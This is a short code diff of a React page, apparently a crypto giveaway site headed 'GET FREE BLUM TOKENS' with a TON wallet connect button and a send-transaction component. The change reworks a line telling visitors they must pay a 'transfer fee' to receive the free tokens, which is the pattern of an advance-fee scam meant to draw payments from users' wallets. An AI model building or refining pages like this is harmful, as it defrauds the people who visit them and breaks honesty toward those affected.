@@ -28,12 +28,10 @@ function App() {
           </a>
         </div>
         <h1>GET FREE BLUM TOKENS</h1>
+
+        <h2>To receive BLUM tokens, you need to pay the transfer fee.</h2>
         <TonConnectButton />
         <AddressInfo />
-        <h2>
-          To receive BLUM tokens, you need to pay the transfer fee to your
-          wallet.
-        </h2>
         <SendTx />
       </div>
     </>
